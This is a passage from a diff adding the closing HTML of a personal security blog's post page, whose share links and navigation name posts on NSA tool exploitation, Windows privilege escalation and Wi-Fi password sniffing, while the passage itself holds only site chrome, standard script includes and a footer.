+        <a href="https://web.whatsapp.com/send?text=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90%20https://p0st3r.github.io/post/nsa-tools/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://p0st3r.github.io/post/nsa-tools/&amp;title=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+
+
+
+
+
+  
+    
+    
+    
+      
+    
+    
+    
+    <div class="media author-card content-widget-hr">
+      
+        
+        <img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hu4bb7090cebbbe4a3e0580de401f23728_6887_270x270_fill_q90_lanczos_center.jpg" alt="">
+      
+
+      <div class="media-body">
+        <h5 class="card-title"><a href="https://p0st3r.github.io/"></a></h5>
+        <h6 class="card-subtitle">Researcher of NTA</h6>
+        <p class="card-text">My research interests include Hacking, Cryptography, Reverse Analysis, and NLP</p>
+        <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+    <li>
+      <a href="mailto:dhakkan@foxmail.com" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/p0st3r" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+</ul>
+
+      </div>
+    </div>
+  
+
+
+  
+
+
+
+
+
+
+
+
+<div class="article-widget">
+  
+<div class="post-nav">
+  
+  
+  
+  <div class="post-nav-item">
+    <div class="meta-nav">Next</div>
+    <a href="/post/h3c-wifi-sniff/" rel="next">H3C校园网WIFI密码嗅探</a>
+  </div>
+  
+  
+  
+  <div class="post-nav-item">
+    <div class="meta-nav">Previous</div>
+    <a href="/post/win-getshell-and-open-rdp/" rel="prev">Windows服务器提权和开启3389远程连接</a>
+  </div>
+  
+</div>
+
+</div>
+
+
+
+  
+  
+  <div class="article-widget content-widget-hr">
+    <h3>Related</h3>
+    <ul>
+      
+      <li><a href="/publication/ms-08-067-analyise/">MS08-067漏洞原理及复现分析</a></li>
+      
+    </ul>
+  </div>
+  
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.4.8/mermaid.min.js" integrity="sha256-lyWCDMnMeZiXRi7Zl54sZGKYmgQs4izcT7+tKc+KUBk=" crossorigin="anonymous" title="mermaid"></script>
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    <script>const isSiteThemeDark = false;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+  <p class="powered-by">
+    
+      <a href="/privacy/">Privacy Policy</a>
+    
+    
+  </p>
+  
+
+  <p class="powered-by">
+    2016 &middot;  ©Lithium No rights reserved.
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span>
+    &middot;
+    <span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span>
+    
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
